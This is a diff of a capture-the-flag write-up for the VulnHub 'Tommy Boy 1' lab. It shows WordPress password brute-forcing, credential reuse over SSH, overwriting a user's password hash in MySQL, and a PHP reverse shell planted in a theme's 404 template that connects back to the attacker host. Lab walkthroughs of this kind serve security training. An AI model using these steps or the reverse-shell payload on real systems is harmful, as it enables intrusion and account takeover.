@@ -18,7 +18,7 @@ layout: default
         <li><a href="#summary">Summary</a></li>
         <li><a href="#portscan">Port Scanning</a></li>
         <li><a href="#infogather">Information Gathering</a></li>
-        <li><a href="#foothold">Foothold</a></li>
+        <li><a href="#bigtommysenior">Shell - bigtommysenior</a></li>
         <li><a href="#root">Privesc - root</a></li>
     </ul>
 
@@ -78,6 +78,9 @@ Exif Image Width                : 1600&#13;&#10;Exif Image Height               
             <li>The password is supposed to be very easy to guess.</li>
         </ul>
     </ul>
+
+    <br>
+    <h2><a id="bigtommysenior">Shell - bigtommysenior</a></h2>
 
     <li>First I login the the FTP server.  The credentials turn out to be nickburns:nickburns.  On the FTP server is file named readme.txt.  I download it.  It reveals a directory that works as a dropbox named "NickIzL33t".  It also says I should be able to find Big Tom's password in that directory.  I browse to the dropbox on port 8008 but I hit a roadblock</li>
 
@@ -203,74 +206,7 @@ Progress: 205096 / 28688786 (0.71%)           [ERROR] 2021/09/27 20:28:16 [!] pa
     <li>The takeaway here, is that we need to get into Tom's wordpress account in order to find the numbers that go after his server (ssh?) password.  The Queen song that the password file hints at is "We Will Rock You" which leads us to rockyou.txt for our password list.  I run wpscan twice to get the valid credentials.  The first time I run it without a user list so that wpscan enumerates users for me.</li>
 
     <pre>
-┌──(kali㉿kali)-[~/Documents/VulnHub/TommyBoy_1]
-└─$ wpscan --url http://10.0.0.22/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt 
-_______________________________________________________________
-         __          _______   _____
-         \ \        / /  __ \ / ____|
-          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-            \  /\  /  | |     ____) | (__| (_| | | | |
-             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-         WordPress Security Scanner by the WPScan Team
-                         Version 3.8.18
-       Sponsored by Automattic - https://automattic.com/
-       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-                    (Lines Removed)
-
-[+] Enumerating Users (via Passive and Aggressive Methods)
- Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00
-
-[i] User(s) Identified:
-
-[+] tommy
- | Found By: Author Posts - Author Pattern (Passive Detection)
- | Confirmed By:
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
-
-[+] richard
- | Found By: Author Posts - Author Pattern (Passive Detection)
- | Confirmed By:
- |  Rss Generator (Passive Detection)
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
-
-[+] tom
- | Found By: Author Posts - Author Pattern (Passive Detection)
- | Confirmed By:
- |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- |  Login Error Messages (Aggressive Detection)
-
-[+] Tom Jr.
- | Found By: Rss Generator (Passive Detection)
-
-[+] Big Tom
- | Found By: Rss Generator (Passive Detection)
-
-[+] michelle
- | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
- | Confirmed By: Login Error Messages (Aggressive Detection)
-
-[+] Performing password attack on Wp Login against 6 user/s
-^Cying Tom Jr. / kiss Time: 00:09:58 <                                    > (92405 / 86066352)  0.10%  ETA: ??:??:??
-[i] No Valid Passwords Found.
-
-[!] No WPScan API Token given, as a result vulnerability data has not been output. / 86066352)  0.10%  ETA: ??:??:??
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Tue Sep 28 10:49:48 2021
-[+] Requests Done: 92577
-[+] Cached Requests: 39
-[+] Data Sent: 49.071 MB
-[+] Data Received: 339.861 MB
-[+] Memory used: 303.793 MB
-[+] Elapsed time: 00:10:03
-
-Scan Aborted: Canceled by User
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ wpscan --url http://10.0.0.22/prehistoricforest/ -P /usr/share/wordlists/rockyou.txt &#13;&#10;_______________________________________________________________&#13;&#10;         __          _______   _____&#13;&#10;         \ \        / /  __ \ / ____|&#13;&#10;          \ \  /\  / /| |__) | (___   ___  __ _ _ __ &reg;&#13;&#10;           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &apos;_ \&#13;&#10;            \  /\  /  | |     ____) | (__| (_| | | | |&#13;&#10;             \/  \/   |_|    |_____/ \___|\__,_|_| |_|&#13;&#10;&#13;&#10;         WordPress Security Scanner by the WPScan Team&#13;&#10;                         Version 3.8.18&#13;&#10;       Sponsored by Automattic - https://automattic.com/&#13;&#10;       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart&#13;&#10;_______________________________________________________________&#13;&#10;&#13;&#10;                    (Lines Removed)&#13;&#10;&#13;&#10;[+] Enumerating Users (via Passive and Aggressive Methods)&#13;&#10; Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00&#13;&#10;&#13;&#10;[i] User(s) Identified:&#13;&#10;&#13;&#10;[+] tommy&#13;&#10; | Found By: Author Posts - Author Pattern (Passive Detection)&#13;&#10; | Confirmed By:&#13;&#10; |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; |  Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] richard&#13;&#10; | Found By: Author Posts - Author Pattern (Passive Detection)&#13;&#10; | Confirmed By:&#13;&#10; |  Rss Generator (Passive Detection)&#13;&#10; |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; |  Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] tom&#13;&#10; | Found By: Author Posts - Author Pattern (Passive Detection)&#13;&#10; | Confirmed By:&#13;&#10; |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; |  Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] Tom Jr.&#13;&#10; | Found By: Rss Generator (Passive Detection)&#13;&#10;&#13;&#10;[+] Big Tom&#13;&#10; | Found By: Rss Generator (Passive Detection)&#13;&#10;&#13;&#10;[+] michelle&#13;&#10; | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)&#13;&#10; | Confirmed By: Login Error Messages (Aggressive Detection)&#13;&#10;&#13;&#10;[+] Performing password attack on Wp Login against 6 user/s&#13;&#10;^Cying Tom Jr. / kiss Time: 00:09:58 &lt;                                    &gt; (92405 / 86066352)  0.10%  ETA: ??:??:??&#13;&#10;[i] No Valid Passwords Found.&#13;&#10;&#13;&#10;[!] No WPScan API Token given, as a result vulnerability data has not been output. / 86066352)  0.10%  ETA: ??:??:??&#13;&#10;[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register&#13;&#10;&#13;&#10;[+] Finished: Tue Sep 28 10:49:48 2021&#13;&#10;[+] Requests Done: 92577&#13;&#10;[+] Cached Requests: 39&#13;&#10;[+] Data Sent: 49.071 MB&#13;&#10;[+] Data Received: 339.861 MB&#13;&#10;[+] Memory used: 303.793 MB&#13;&#10;[+] Elapsed time: 00:10:03&#13;&#10;&#13;&#10;Scan Aborted: Canceled by User
     </pre>
 
     <li>It takes too long to brute force against all of the users that were enumerated so I take "big tom" and "tom" and put them in a user list so I am only brute forcing against those two usernames.  The other usernames do not seem like they would apply to Tom Sr., which is who's account we are trying to access.  So I run wordpress again using this username list and I get valid credentials.</li>
@@ -286,12 +222,86 @@ Scan Aborted: Canceled by User
     <br>
     <br>
 
-    
+    <li>We can now SSH in using the credentials bigtommysenior:fatguyinalittlecoat1938!!</li>
 
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/TommyBoy_1]&#13;&#10;&boxur;&HorizontalLine;$ ssh bigtommysenior@10.0.0.22                                                                              130 &Cross;&#13;&#10;bigtommysenior@10.0.0.22&apos;s password: &#13;&#10;Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-31-generic x86_64)&#13;&#10;&#13;&#10; * Documentation:  https://help.ubuntu.com/&#13;&#10;&#13;&#10;143 packages can be updated.&#13;&#10;0 updates are security updates.&#13;&#10;&#13;&#10;&#13;&#10;Last login: Thu Jul 14 13:45:57 2016&#13;&#10;bigtommysenior@CallahanAutoSrv01:~$ 
+    </pre>
 
+    <li>Once on the box, we find a file called LOOT.ZIP in bigtommysenior's home directory.  The file is encrypted and I am unable to crack it.  There is another file called el-flag-numero-quatro.txt.  This file gives us the 4th flag for the box.  It also tells us the 5th flag is locate in the root directory /5.txt.  The 5th flag is unreadable by us but owned by www-data.  If we can get a shell as www-data we will get access to the 5th flag.</li>
 
     <br>
-    <h2><a id="foothold">Foothold</a></h2>
+
+    <li>If we can login to wordpress as an admin user then we can get a web shell as www-data, and subsequently a full reverse shell.  We look to mysql to find credentials for a wordpress admin account.  The mysql credentials are found in /var/www/html/prehistoricforest/wp-admin.php</li>
+
+    <pre>
+define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);&#13;&#10;define(&apos;DB_USER&apos;, &apos;wordpressuser&apos;);&#13;&#10;define(&apos;DB_PASSWORD&apos;, &apos;CaptainLimpWrist!!!&apos;);&#13;&#10;define(&apos;DB_HOST&apos;, &apos;localhost&apos;);&#13;&#10;define(&apos;DB_CHARSET&apos;, &apos;utf8&apos;);&#13;&#10;define(&apos;DB_COLLATE&apos;, &apos;&apos;);
+    </pre>
+
+    <li>I log into the mysql databases.  \'s are required to escape the ! characters.</li>
+
+    <pre>
+bigtommysenior@CallahanAutoSrv01:/var/www/html$ mysql -u wordpressuser -pCaptainLimpWrist\!\!\!&#13;&#10;mysql: [Warning] Using a password on the command line interface can be insecure.&#13;&#10;Welcome to the MySQL monitor.  Commands end with ; or \g.&#13;&#10;Your MySQL connection id is 323899&#13;&#10;Server version: 5.7.13-0ubuntu0.16.04.2 (Ubuntu)&#13;&#10;&#13;&#10;Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.&#13;&#10;&#13;&#10;Oracle is a registered trademark of Oracle Corporation and/or its&#13;&#10;affiliates. Other names may be trademarks of their respective&#13;&#10;owners.&#13;&#10;&#13;&#10;Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.&#13;&#10;&#13;&#10;mysql&gt; 
+    </pre>
+
+    <li>I take a look at the wordpress users</li>
+
+    <pre>
+mysql&gt; show databases;&#13;&#10;+--------------------+&#13;&#10;| Database           |&#13;&#10;+--------------------+&#13;&#10;| information_schema |&#13;&#10;| wordpress          |&#13;&#10;+--------------------+&#13;&#10;2 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; use wordpress&#13;&#10;Reading table information for completion of table and column names&#13;&#10;You can turn off this feature to get a quicker startup with -A&#13;&#10;&#13;&#10;Database changed&#13;&#10;mysql&gt; show tables;&#13;&#10;+-----------------------+&#13;&#10;| Tables_in_wordpress   |&#13;&#10;+-----------------------+&#13;&#10;| wp_commentmeta        |&#13;&#10;| wp_comments           |&#13;&#10;| wp_links              |&#13;&#10;| wp_options            |&#13;&#10;| wp_postmeta           |&#13;&#10;| wp_posts              |&#13;&#10;| wp_term_relationships |&#13;&#10;| wp_term_taxonomy      |&#13;&#10;| wp_termmeta           |&#13;&#10;| wp_terms              |&#13;&#10;| wp_usermeta           |&#13;&#10;| wp_users              |&#13;&#10;+-----------------------+&#13;&#10;12 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; select * from wp_users;&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;| ID | user_login | user_pass                          | user_nicename | user_email               | user_url                                    | user_registered     | user_activation_key | user_status | display_name      |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;|  1 | richard    | $P$B4j12Ej1AtVPkWprh2R/Dc/6D1poMJ. | richard       | richard@callahanauto.tb  |                                             | 2016-07-06 20:49:04 |                     |           0 | richard           |&#13;&#10;|  2 | tom        | $P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK. | tom           | tom@callahanauto.tb      | https://en.wikipedia.org/wiki/Brian_Dennehy | 2016-07-06 20:51:09 |                     |           0 | Big Tom           |&#13;&#10;|  3 | tommy      | $P$BCcKbJIQtLuiBOybaQPkkfe1yYJRkn. | tommy         | littletom@callahan.tb    | http://www.imdb.com/title/tt3910602/        | 2016-07-06 21:17:30 |                     |           0 | Tom Jr.           |&#13;&#10;|  4 | michelle   | $P$BIEfXY1Li5aYTokSsi7pBgh0FTlO6k/ | michelle      | michelle@callahanauto.tb |                                             | 2016-07-06 22:13:17 |                     |           0 | Michelle Michelle |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;4 rows in set (0.00 sec)
+    </pre>
+
+    <li>I am unable to crack any of the hashes.  The mysql password also never worked when I tried against other users on the box.  So I decided to replace richard's password with my own, so I can login as richard on wordpress and create a web shell.  In order to do this I find a website using google in order to generate a new wordpress hash to replace the current one with.</li>
+
+    <img src="../images/tommyboy1/wp_hash.png">
+
+    <br>
+    <br>
+
+    <li>Now we just need to edit the sql command that the website generates to target richard and enter the command into the mysql database.</li>
+
+    <pre>
+mysql&gt; UPDATE `wp_users` SET `user_pass` = &apos;$P$B4j12Ej1AtVPkWprh2R/Dc/6D1poMJ.&apos; WHERE user_login = &apos;richard&apos;;&#13;&#10;Query OK, 1 row affected (0.00 sec)&#13;&#10;Rows matched: 1  Changed: 1  Warnings: 0&#13;&#10;&#13;&#10;mysql&gt; select * from wp_users;&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;| ID | user_login | user_pass                          | user_nicename | user_email               | user_url                                    | user_registered     | user_activation_key | user_status | display_name      |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;|  1 | richard    | $P$B4j12Ej1AtVPkWprh2R/Dc/6D1poMJ. | richard       | richard@callahanauto.tb  |                                             | 2016-07-06 20:49:04 |                     |           0 | richard           |&#13;&#10;|  2 | tom        | $P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK. | tom           | tom@callahanauto.tb      | https://en.wikipedia.org/wiki/Brian_Dennehy | 2016-07-06 20:51:09 |                     |           0 | Big Tom           |&#13;&#10;|  3 | tommy      | $P$BCcKbJIQtLuiBOybaQPkkfe1yYJRkn. | tommy         | littletom@callahan.tb    | http://www.imdb.com/title/tt3910602/        | 2016-07-06 21:17:30 |                     |           0 | Tom Jr.           |&#13;&#10;|  4 | michelle   | $P$BIEfXY1Li5aYTokSsi7pBgh0FTlO6k/ | michelle      | michelle@callahanauto.tb |                                             | 2016-07-06 22:13:17 |                     |           0 | Michelle Michelle |&#13;&#10;+----+------------+------------------------------------+---------------+--------------------------+---------------------------------------------+---------------------+---------------------+-------------+-------------------+&#13;&#10;4 rows in set (0.00 sec)&#13;&#10;&#13;&#10;mysql&gt; exit
+    </pre>
+
+    <li>Now we can login to wordpress (http://10.0.0.22/prehistoricforest/wp-admin/) using the credentials richard:hacked.  Once logged in we need to create a reverse shell so we can get a shell as the user www-data.  For this, we navigate to appearance > editor > 404 Template.  We create our web shell here.</li>
+
+    <img src="../images/tommyboy1/rev_shell.png">
+
+    <br>
+    <br>
+
+    <li>Then I start my netcat listener on port 80 and navigate the the 404.php page.  I find the directory for the 404.php page by searching through the files in the /var/www/html/prehistoricforest directory.</li>
+
+    <pre>
+bigtommysenior@CallahanAutoSrv01:/var/www/html/prehistoricforest$ cat ./wp-content/themes/twentyfourteen/404.php&#13;&#10;&lt;?php&#13;&#10;/**&#13;&#10; * The template for displaying 404 pages (Not Found)&#13;&#10; *&#13;&#10; * @package WordPress&#13;&#10; * @subpackage Twenty_Fourteen&#13;&#10; * @since Twenty Fourteen 1.0&#13;&#10; */&#13;&#10;&#13;&#10;get_header(); ?&gt;&#13;&#10;&#13;&#10;&#13;&#10;&#9;&lt;div id=&quot;primary&quot; class=&quot;content-area&quot;&gt;&#13;&#10;&#9;&#9;&lt;div id=&quot;content&quot; class=&quot;site-content&quot; role=&quot;main&quot;&gt;&#13;&#10;&#13;&#10;&#9;&#9;&#9;&lt;header class=&quot;page-header&quot;&gt;&#13;&#10;&#9;&#9;&#9;&#9;&lt;h1 class=&quot;page-title&quot;&gt;&lt;?php _e( &apos;Not Found&apos;, &apos;twentyfourteen&apos; ); ?&gt;&lt;/h1&gt;&#13;&#10;&#9;&#9;&#9;&lt;/header&gt;&#13;&#10;&#13;&#10;&#9;&#9;&#9;&lt;div class=&quot;page-content&quot;&gt;&#13;&#10;&#9;&#9;&#9;&#9;&lt;p&gt;&lt;?php _e( &apos;It looks like nothing was found at this location. Maybe try a search?&apos;, &apos;twentyfourteen&apos; ); ?&gt;&lt;/p&gt;&#13;&#10;&#13;&#10;&#9;&#9;&#9;&#9;&lt;?php get_search_form(); ?&gt;&#13;&#10;&#9;&#9;&#9;&lt;/div&gt;&lt;!-- .page-content --&gt;&#13;&#10;&#13;&#10;&#9;&#9;&lt;/div&gt;&lt;!-- #content --&gt;&#13;&#10;&#9;&lt;/div&gt;&lt;!-- #primary --&gt;&#13;&#10;&#13;&#10;&lt;?php&#13;&#10;get_sidebar( &apos;content&apos; );&#13;&#10;get_sidebar();&#13;&#10;get_footer();&#13;&#10;bigtommysenior@CallahanAutoSrv01:/var/www/html/prehistoricforest$ cat ./wp-content/themes/twentysixteen/404.php&#13;&#10;&lt;?php system(&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.0.0.1/80 0&gt;&amp;1&apos;&quot;); ?&gt;&#13;&#10;bigtommysenior@CallahanAutoSrv01:/var/www/html/prehistoricforest$ 
+    </pre>
+
+    <li>Navigating to http://10.0.0.22/prehistoricforest/wp-content/themes/twentysixteen/404.php should connect to the netcat listener with a reverse shell as www-data.  Now we can read the flag in the root directory.</li>
+
+    <pre>
+www-data@CallahanAutoSrv01:/$ cat .5	
+cat .5.txt 
+FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!!
+
+Flag data: Buttcrack
+
+Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.
+So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you"
+you would create this blob:
+
+hithereyou
+
+Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's
+folder and you can call the box PWNED.
+    </pre>
+
+    <li></li>
+
+
+
+
 
 
     <br>
@@ -300,3 +310,4 @@ Scan Aborted: Canceled by User
 </body>
 </html>
 
+ 	UPDATE <Table> SET <Column>='<Value>' WHERE <Column>='<Value>';
